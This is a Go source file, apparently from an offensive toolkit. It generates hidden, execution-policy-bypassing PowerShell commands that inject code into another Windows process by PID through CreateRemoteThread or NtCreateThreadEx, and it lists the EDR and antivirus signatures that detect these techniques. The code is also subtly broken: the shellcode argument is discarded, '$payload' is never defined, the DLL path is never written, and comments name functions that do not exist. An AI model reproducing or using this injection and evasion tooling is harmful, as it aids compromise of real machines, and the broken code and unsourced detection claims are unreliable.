package processinjection

import "fmt"

func InjectCreateRemoteThread(targetPID int, dllPath string) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	cmd := fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[System.Runtime.InteropServices.Marshal]::WriteIntPtr($h,$addr,$h); `+
			`$t=[PoshWin32.Kernel32]::CreateRemoteThread($h,0,0,$addr,0,0,0); `+
			`[PoshWin32.Kernel32]::WaitForSingleObject($t,0xFFFFFFFF)"`,
		targetPID,
	)
	return cmd, nil
}

func InjectCreateRemoteThreadShellcode(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	cmd := fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`[PoshWin32.Kernel32]::CreateRemoteThread($h,0,0,$addr,0,0,0)"`,
		targetPID,
	)
	return cmd, nil
}

func InjectNtCreateThreadEx(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	cmd := fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$ntdll=[PoshWin32.Kernel32]::GetModuleHandle('ntdll'); `+
			`$fn=[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateThreadEx'); `+
			`$del=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fn,[Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr]]); `+
			`$del.Invoke($h,0,0,$addr,0,0,0,0,0,0)"`,
		targetPID,
	)
	return cmd, nil
}

// APIMap returns the Windows API call sequence for CreateRemoteThread injection
func CreateRemoteThreadAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) -> hProcess",
		2: "VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) -> lpRemoteAddr",
		3: "WriteProcessMemory(hProcess, lpRemoteAddr, lpBuffer, dwSize, &lpNumberOfBytesWritten)",
		4: "VirtualProtectEx(hProcess, lpRemoteAddr, dwSize, PAGE_EXECUTE_READ, &lpOldProtect)",
		5: "CreateRemoteThread(hProcess, NULL, 0, lpRemoteAddr, lpParameter, 0, &dwThreadId) -> hThread",
		6: "WaitForSingleObject(hThread, INFINITE)",
		7: "VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE)",
		8: "CloseHandle(hThread)",
		9: "CloseHandle(hProcess)",
	}
}

// NativeAPIMap returns the NT API call sequence for NtCreateThreadEx injection
func NtCreateThreadExAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) -> hProcess",
		2: "VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) -> lpRemoteAddr",
		3: "WriteProcessMemory(hProcess, lpRemoteAddr, lpBuffer, dwSize, NULL)",
		4: "NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, lpRemoteAddr, NULL, FALSE, 0, 0, 0, NULL)",
		5: "NtClose(hThread)",
		6: "NtClose(hProcess)",
	}
}

// EDRDetectionSignatures returns the EDR/AV signatures that detect CreateRemoteThread
func CreateRemoteThreadDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":     "CreateRemoteThread detected - the canonical detection for remote thread creation across processes",
		"Sysmon EventID 10":    "ProcessAccess detected - OpenProcess with PROCESS_ALL_ACCESS to a non-child process",
		"Sysmon EventID 7":    "ImageLoaded detected when LoadLibrary loads injected DLL",
		"EventID 4688":         "Process Creation - if creating a new process for injection target",
		"CrowdStrike VBS":     "CS EDR detects OpenProcess + WriteProcessMemory + CreateRemoteThread chain via kernel callbacks",
		"SentinelOne":         "S1 detects via CreateRemoteThread hook in ntdll!NtCreateThreadEx",
		"Microsoft Defender":  "MDE detects via ETW Provider-Microsoft-Windows-Kernel-Process events for thread creation",
		"AMSI EventID 1105":   "AMSI scan of PowerShell script attempting injection",
		"Carbon Black":        "CB EDR hooks kernel32!CreateRemoteThread and ntdll!NtCreateThreadEx",
	}
}
